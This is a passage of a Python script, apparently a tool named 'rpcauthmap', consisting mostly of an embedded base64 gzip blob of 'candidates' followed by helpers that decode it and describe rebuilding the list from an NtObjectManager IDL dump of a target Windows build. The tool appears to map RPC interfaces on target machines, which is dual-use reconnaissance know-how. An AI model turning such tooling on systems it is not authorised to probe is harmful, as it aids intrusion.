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
mXL1gPVIAgA=
"""


def _embedded_candidates_csv():
    import base64 as _b64
    import gzip as _gz
    blob = ''.join(_EMBEDDED_CANDIDATES_B64.split())
    if not blob or blob == '__EMBED_HERE__':
        return ''
    try:
        return _gz.decompress(_b64.b64decode(blob)).decode('utf-8')
    except Exception:
        return ''


_SIDECAR_NAME = 'rpcauthmap_candidates.csv'


def _sidecar_path():
    """Path to the generated candidate list that sits next to this script."""
    try:
        return os.path.join(os.path.dirname(os.path.abspath(__file__)),
                            _SIDECAR_NAME)
    except Exception:
        return _SIDECAR_NAME


# --------------------------------------------------------------------------- #
# --rebuild : parse an NtObjectManager IDL dump into a candidate list, written
# as a sidecar CSV next to this script. This is the make_candidates.py logic
# folded in, so the tool is a single file. The dump itself must be produced on a
# Windows host of the target's build (see --help epilog / README), because the
# data lives in that machine's DLLs.
# --------------------------------------------------------------------------- #
